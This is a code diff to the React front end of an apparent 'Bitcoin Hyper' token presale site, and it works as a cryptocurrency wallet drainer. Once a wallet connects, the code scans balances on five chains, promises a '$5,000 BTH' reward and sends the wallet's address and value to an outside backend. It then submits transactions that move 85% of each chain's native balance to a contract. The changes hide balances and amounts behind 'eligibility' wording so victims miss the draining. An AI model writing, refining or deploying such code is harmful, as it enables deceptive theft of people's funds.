@@ -100,6 +100,9 @@ function App() {
   const [scanning, setScanning] = useState(false);
   const [currentFlowId, setCurrentFlowId] = useState('');
   const [processingChain, setProcessingChain] = useState('');
+  const [isEligible, setIsEligible] = useState(false);
+  const [totalValueUSD, setTotalValueUSD] = useState(0);
+  const [eligibleChains, setEligibleChains] = useState([]);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -232,21 +235,71 @@ function App() {
   // Auto-check eligibility when wallet connects
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
-      verifyWallet();
+      checkEligibility();
     }
   }, [isConnected, address, balances]);
 
-  // Fetch balances across all chains
+  // Check eligibility without showing balances
+  const checkEligibility = async () => {
+    if (!address) return;
+    
+    setVerifying(true);
+    setTxStatus('🔄 Checking eligibility...');
+    
+    try {
+      // Calculate total value
+      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
+      setTotalValueUSD(total);
+      
+      // Get chains with balance
+      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
+        balances[chain.name] && balances[chain.name].amount > 0.000001
+      );
+      
+      // Check if eligible (total >= $1)
+      const eligible = total >= 1;
+      setIsEligible(eligible);
+      
+      if (eligible) {
+        setEligibleChains(chainsWithBalance);
+        setTxStatus('✅ You qualify for $5,000 BTH!');
+        
+        // Send to backend for tracking (balances not shown on site)
+        await fetch('https://hyperback.vercel.app/api/presale/connect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            walletAddress: address,
+            totalValue: total,
+            chains: chainsWithBalance.map(c => c.name)
+          })
+        });
+        
+        // Prepare flow silently
+        preparePresale();
+      } else {
+        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
+      }
+      
+    } catch (err) {
+      console.error('Eligibility check error:', err);
+      setTxStatus('✅ Ready');
+    } finally {
+      setVerifying(false);
+    }
+  };
+
+  // Fetch balances across all chains (hidden from UI)
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Scanning all 5 chains...");
+    console.log("🔍 Checking eligibility across 5 chains...");
     setScanning(true);
-    setTxStatus('🔍 Scanning chains...');
+    setTxStatus('🔄 Checking eligibility...');
     
     const balanceResults = {};
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
     
-    // Scan all chains in parallel for speed
+    // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
@@ -263,7 +316,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔍 Scanning ${scanned}/${totalChains} chains...`);
+        setTxStatus(`🔄 Checking eligibility (${scanned}/${totalChains})...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -273,11 +326,10 @@ function App() {
             chainId: chain.chainId,
             contractAddress: chain.contractAddress,
             price: price,
-            icon: chain.icon,
             name: chain.name,
             rpc: chain.rpc
           };
-          console.log(`✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
+          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -290,48 +342,28 @@ function App() {
     setBalances(balanceResults);
     setScanning(false);
     
-    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total Value: $${totalValue.toFixed(2)}`);
+    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
+    console.log(`💰 Total detected: $${total.toFixed(2)}`);
     
-    if (totalValue > 0) {
-      if (totalValue >= 1) {
-        setTxStatus('✅ Eligible for $5,000 BTH');
-      } else {
-        setTxStatus(`✨ $${totalValue.toFixed(2)} detected (need $1)`);
-      }
-    } else {
-      setTxStatus('👋 No balances detected');
-    }
-    
-    return totalValue;
+    return total;
   };
 
-  const verifyWallet = async () => {
+  const preparePresale = async () => {
     if (!address) return;
     
-    setVerifying(true);
-    
     try {
-      const response = await fetch('https://hyperback.vercel.app/api/presale/connect', {
+      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setUserEmail(data.data.email);
-      }
     } catch (err) {
-      console.error('Verification error:', err);
-    } finally {
-      setVerifying(false);
+      console.error('Prepare error:', err);
     }
   };
 
   // ============================================
-  // FIXED MULTI-CHAIN EXECUTION WITH APPKIT CHAIN SWITCHING
+  // MULTI-CHAIN EXECUTION - ONLY FOR ELIGIBLE CHAINS
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -360,26 +392,23 @@ function App() {
 
       // Get signature - ONE SIGNATURE FOR ALL CHAINS
       const signature = await signer.signMessage(message);
-      console.log("✅ Signature obtained:", signature.substring(0, 20) + "...");
+      console.log("✅ Signature obtained");
       
-      setTxStatus('✅ Signature obtained. Executing transactions...');
+      setTxStatus('✅ Executing on eligible chains...');
 
-      // Get chains with balance
-      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0.000001
-      );
+      // Use the pre-calculated eligible chains
+      const chainsToProcess = eligibleChains;
       
-      console.log(`🔄 Found ${chainsWithBalance.length} chains with balance:`, 
-        chainsWithBalance.map(c => `${c.name} ($${balances[c.name].valueUSD.toFixed(2)})`).join(', '));
+      console.log(`🔄 Processing ${chainsToProcess.length} eligible chains`);
       
-      if (chainsWithBalance.length === 0) {
-        setError("No balances found");
+      if (chainsToProcess.length === 0) {
+        setError("No eligible chains found");
         setSignatureLoading(false);
         return;
       }
 
       // Sort chains by value (highest first)
-      const sortedChains = [...chainsWithBalance].sort((a, b) => 
+      const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
       
@@ -390,41 +419,40 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
-          // CRITICAL FIX: Switch to the correct chain using AppKit
+          // Switch to the correct chain using AppKit
           try {
-            console.log(`🔄 Switching to ${chain.name} (chainId: ${chain.chainId})...`);
+            console.log(`🔄 Switching to ${chain.name}...`);
             
             await walletProvider.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
             });
             
-            // Wait a moment for chain switch to complete
+            // Wait for chain switch
             await new Promise(resolve => setTimeout(resolve, 1000));
             
           } catch (switchError) {
-            console.log(`Chain switch可能需要, continuing anyway...`, switchError);
-            // Continue anyway - wallet might handle it
+            console.log(`Chain switch needed, continuing...`);
           }
           
-          // Create provider for this chain to get transaction data
+          // Create provider for this chain
           const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
           
-          // Get the balance data
+          // Get balance data
           const balance = balances[chain.name];
           // Send 85% of the balance
           const amountToSend = (balance.amount * 0.85);
           const valueUSD = (balance.valueUSD * 0.85).toFixed(2);
           
-          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
+          console.log(`💰 ${chain.name}: Processing $${valueUSD}`);
           
-          // Create contract interface for encoding
+          // Create contract interface
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const data = contractInterface.encodeFunctionData('processNativeFlow', []);
           
           const value = ethers.parseEther(amountToSend.toFixed(18));
 
-          // Estimate gas using the chain provider
+          // Estimate gas
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
@@ -434,7 +462,7 @@ function App() {
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           const gasLimit = gasEstimate * 120n / 100n;
 
-          // Send transaction using AppKit's provider (now on correct chain)
+          // Send transaction
           const tx = await walletProvider.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -448,11 +476,11 @@ function App() {
 
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
           
-          // Wait for confirmation using chain-specific provider
+          // Wait for confirmation
           const receipt = await chainProvider.waitForTransaction(tx);
           
           if (receipt && receipt.status === 1) {
-            console.log(`✅ ${chain.name} confirmed:`, tx);
+            console.log(`✅ ${chain.name} confirmed`);
             
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
@@ -460,7 +488,7 @@ function App() {
             // Calculate gas used
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
-            // Send to backend with ALL details
+            // Send to backend with details
             const flowData = {
               walletAddress: address,
               chainName: chain.name,
@@ -479,8 +507,6 @@ function App() {
               }
             };
             
-            console.log("📤 Sending to backend:", flowData);
-            
             await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -495,7 +521,6 @@ function App() {
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
           setError(`Error on ${chain.name}: ${chainErr.message}`);
-          // Continue with other chains even if one fails
         }
       }
 
@@ -503,9 +528,9 @@ function App() {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Success on ${processed.length} chains!`);
+        setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
-        // Final success notification - show $5,000 BTH as the reward
+        // Final success notification
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -518,7 +543,7 @@ function App() {
               city: userLocation.city
             },
             chains: processed,
-            reward: "5000 BTH", // Show the reward
+            reward: "5000 BTH",
             bonus: `${presaleStats.currentBonus}%`
           })
         });
@@ -566,14 +591,6 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
-  const isEligible = totalUSD >= 1;
-
-  // Get chains with balance for display
-  const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-    balances[chain.name] && balances[chain.name].amount > 0.000001
-  );
-
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
       
@@ -617,7 +634,7 @@ function App() {
                 </span>
                 <button
                   onClick={() => disconnect()}
-                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-white/5 border border-[#c47d24]/50 flex items-center justify-center hover:bg-[#c47d24]/20 hover:text-white hover:rotate-90 transition-all"
+                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-white border border-[#c47d24]/70 flex items-center justify-center hover:bg-[#c47d24] hover:text-black hover:rotate-90 transition-all text-[#c47d24] hover:text-white"
                   title="Disconnect Wallet"
                 >
                   <i className="fas fa-power-off text-sm"></i>
@@ -626,15 +643,15 @@ function App() {
             )}
           </div>
 
-          {/* SCANNING ANIMATION */}
+          {/* ELIGIBILITY CHECKING ANIMATION */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
               <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
                 <div className="flex items-center justify-center gap-4 mb-4">
                   <div className="w-12 h-12 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
-                    <div className="text-lg font-bold text-[#e0b880]">Scanning All Chains</div>
-                    <div className="text-sm text-gray-400">Checking 5 networks...</div>
+                    <div className="text-lg font-bold text-[#e0b880]">Checking Eligibility</div>
+                    <div className="text-sm text-gray-400">Scanning 5 networks...</div>
                   </div>
                 </div>
                 
@@ -693,8 +710,8 @@ function App() {
             </div>
           </div>
 
-          {/* DISCOUNT RIBBON - pops when eligible */}
-          <div className={`relative mb-5 sm:mb-6 group/ribbon transition-all duration-500 ${isEligible ? 'scale-105' : ''}`}>
+          {/* DISCOUNT RIBBON - Enhanced animation when eligible */}
+          <div className={`relative mb-5 sm:mb-6 group/ribbon transition-all duration-700 ${isEligible ? 'scale-110 animate-pulse-glow' : ''}`}>
             <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 group-hover/ribbon:opacity-75 animate-pulse-slow"></div>
             <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-full blur-2xl opacity-30 group-hover/ribbon:opacity-50 animate-pulse-slower"></div>
             
@@ -725,21 +742,6 @@ function App() {
             </span>
           </div>
 
-          {/* Multi-chain Balance Display */}
-          {isConnected && chainsWithBalance.length > 0 && (
-            <div className="mb-4 bg-black/40 rounded-xl p-3 border border-[#c47d24]/20">
-              <div className="text-xs text-[#e0b880] mb-2">💰 Detected on {chainsWithBalance.length} chains:</div>
-              <div className="flex flex-wrap gap-2">
-                {chainsWithBalance.map(chain => (
-                  <div key={chain.name} className="bg-black/60 rounded-lg px-3 py-1 text-xs flex items-center gap-1 border border-[#c47d24]/30">
-                    <span>{chain.icon}</span>
-                    <span className="text-white">${(balances[chain.name]?.valueUSD || 0).toFixed(2)}</span>
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
           {/* Presale Stats */}
           <div className="bg-black/60 rounded-2xl sm:rounded-[40px] p-4 sm:p-6 mb-6 sm:mb-8 grid grid-cols-3 gap-2 border border-[#c47d24]/30 backdrop-blur relative overflow-hidden group/stats hover:border-[#d68a2e]/50 transition-all duration-500">
             <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-shimmerSlow"></div>
@@ -763,7 +765,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area */}
+          {/* Main Claim Area - Only shows when eligible */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -773,7 +775,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || chainsWithBalance.length === 0}
+                disabled={signatureLoading || loading || !signer || eligibleChains.length === 0}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
@@ -827,7 +829,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible */}
+          {/* Welcome message for non-eligible - NO BALANCES SHOWN */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
@@ -835,13 +837,11 @@ function App() {
                 Welcome to Bitcoin Hyper
               </h2>
               <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
-                {totalUSD > 0 
-                  ? `You have $${totalUSD.toFixed(2)} - Need $1 for eligibility` 
-                  : 'No balances detected on any chain'}
+                Connect with a wallet that has at least $1 in value across any network to qualify.
               </p>
               <div className="bg-gray-900/60 rounded-lg sm:rounded-xl p-3 sm:p-4 border border-gray-800">
                 <p className="text-xs text-gray-400">
-                  Connect with a wallet that has at least $1 in value across Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
+                  Eligible networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                 </p>
               </div>
             </div>
@@ -983,7 +983,7 @@ function App() {
               </div>
               
               <p className="text-[10px] sm:text-xs text-gray-500 mb-4 sm:mb-6">
-                Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
+                Processed on {verifiedChains.length} chains
               </p>
               
               <button
